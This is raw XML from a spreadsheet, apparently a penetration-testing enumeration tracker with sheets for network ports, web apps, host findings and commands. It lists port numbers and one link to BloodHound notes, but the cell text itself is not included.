      <c r="F15" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>62</v>
      </c>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B16" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C16" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>49</v>
      </c>
      <c r="E16" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49664</v>
      </c>
      <c r="F16" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G16" s="2" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="17" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B17" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C17" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>24</v>
      </c>
      <c r="E17" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49665</v>
      </c>
      <c r="F17" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="18" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B18" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C18" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D18" s="2" t="s">
        <v>25</v>
      </c>
      <c r="E18" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49666</v>
      </c>
      <c r="F18" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G18" s="2" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="19" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B19" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C19" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D19" s="2" t="s">
        <v>48</v>
      </c>
      <c r="E19" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49668</v>
      </c>
      <c r="F19" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G19" s="2" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="20" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B20" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C20" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D20" s="2" t="s">
        <v>42</v>
      </c>
      <c r="E20" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49671</v>
      </c>
      <c r="F20" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G20" s="2" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="21" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B21" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C21" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D21" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E21" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49676</v>
      </c>
      <c r="F21" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G21" s="2" t="s">
        <v>68</v>
      </c>
    </row>
    <row r="22" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B22" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C22" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D22" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E22" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49677</v>
      </c>
      <c r="F22" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G22" s="2" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="23" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B23" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C23" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D23" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E23" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49683</v>
      </c>
      <c r="F23" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G23" s="2" t="s">
        <v>70</v>
      </c>
      <c r="I23" s="4"/>
      <c r="J23" s="5"/>
    </row>
    <row r="24" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B24" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C24" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D24" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E24" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49698</v>
      </c>
      <c r="F24" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G24" s="2" t="s">
        <v>71</v>
      </c>
    </row>
    <row r="25" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B25" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C25" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D25" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E25" s="6" t="str">
        <f t="shared" si="0"/>
        <v>56830</v>
      </c>
      <c r="F25" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G25" s="2" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="26" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B26" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C26" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D26" s="2" t="s">
        <v>27</v>
      </c>
      <c r="E26" s="6" t="str">
        <f t="shared" si="0"/>
        <v>59055</v>
      </c>
      <c r="F26" s="7" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
      <c r="I26" s="4"/>
      <c r="J26" s="5"/>
    </row>
    <row r="27" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B27" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C27" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D27" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E27" s="6" t="str">
        <f t="shared" si="0"/>
        <v>59219</v>
      </c>
      <c r="F27" s="7" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
    <row r="28" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B28" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C28" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D28" s="2" t="s">
        <v>45</v>
      </c>
      <c r="E28" s="6" t="str">
        <f t="shared" si="0"/>
        <v>59950</v>
      </c>
      <c r="F28" s="7" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K29">
    <sortCondition ref="F2:F29"/>
    <sortCondition ref="E2:E29"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="J3" r:id="rId1" xr:uid="{426A6B46-EF15-4B09-8A90-DB0A6C8676D2}"/>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FB5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:H24"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="C12" sqref="C12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="29.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="39.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="18.5546875" style="2" customWidth="1"/>
    <col min="4" max="4" width="34.33203125" style="2" customWidth="1"/>
    <col min="5" max="6" width="64" style="2" customWidth="1"/>
    <col min="7" max="7" width="22.88671875" style="2" customWidth="1"/>
    <col min="8" max="8" width="49.44140625" style="2" customWidth="1"/>
    <col min="9" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1"/>
      <c r="B2" s="2"/>
      <c r="C2" s="2"/>
      <c r="D2" s="2"/>
      <c r="E2" s="2"/>
      <c r="F2" s="2"/>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="G3" s="5"/>
    </row>
    <row r="4" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
    </row>
    <row r="5" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="E5" s="1"/>
    </row>
    <row r="6" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E6" s="1"/>
      <c r="F6" s="4"/>
    </row>
    <row r="8" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D8" s="4"/>
    </row>
    <row r="9" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D9" s="4"/>
    </row>
    <row r="10" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D10" s="4"/>
      <c r="F10" s="5"/>
    </row>
    <row r="11" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D11" s="4"/>
    </row>
    <row r="12" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D12" s="4"/>
    </row>
    <row r="13" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D13" s="4"/>
    </row>
    <row r="14" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D14" s="4"/>
    </row>
    <row r="15" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D15" s="4"/>
    </row>
    <row r="24" spans="7:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G24" s="5"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3"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E3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K4"/>
  <sheetViews>
    <sheetView zoomScale="73" zoomScaleNormal="73" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="A2" sqref="A2"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="16.109375" style="2" customWidth="1"/>
    <col min="2" max="2" width="12.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="10.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="11.5546875" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="6" max="6" width="85.6640625" style="2" customWidth="1"/>
    <col min="7" max="7" width="25.109375" style="2" customWidth="1"/>
    <col min="8" max="8" width="69.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="45.88671875" style="2" customWidth="1"/>
    <col min="10" max="10" width="77.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="57.21875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>96</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>84</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>85</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>86</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>94</v>
      </c>
      <c r="I2" s="5" t="s">
        <v>95</v>
      </c>
      <c r="J2" s="4" t="s">
        <v>93</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="E3" s="1"/>
      <c r="I3" s="5"/>
      <c r="J3" s="4"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="I2" r:id="rId1" display="https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/bloodhound" xr:uid="{A6F4EE56-B7AB-414B-9090-B56CFCC28085}"/>
  </hyperlinks>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3E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:A24"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <selection activeCell="A25" sqref="A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="118.88671875" style="8" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>97</v>
      </c>
    </row>
    <row r="3" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="4" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="8" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="8" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="8" t="s">
        <v>99</v>
      </c>
    </row>
    <row r="7" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="8" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="8" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="8" t="s">
        <v>100</v>
      </c>
    </row>
    <row r="9" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="8" t="s">
        <v>101</v>
      </c>
    </row>
    <row r="10" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="8" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="11" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="8" t="s">
        <v>102</v>
      </c>
    </row>
    <row r="12" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="8" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="13" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="8" t="s">
        <v>103</v>
      </c>
    </row>
    <row r="14" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="8" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="15" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="8" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="16" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="8" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="17" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="8" t="s">
        <v>91</v>
      </c>
    </row>
    <row r="18" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="8" t="s">
        <v>92</v>
      </c>
    </row>
    <row r="19" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="8" t="s">
        <v>104</v>
      </c>
    </row>
    <row r="20" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="8" t="s">
        <v>105</v>
      </c>
    </row>
    <row r="21" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="8" t="s">
        <v>106</v>
      </c>
    </row>
    <row r="22" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="8" t="s">
        <v>107</v>
      </c>
    </row>
    <row r="23" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="8" t="s">
        <v>108</v>
      </c>
    </row>
    <row r="24" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="8" t="s">
        <v>109</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FAFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A25" sqref="A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-29T03:09:27Z</dcterms:modified>
</cp:coreProperties>
</file>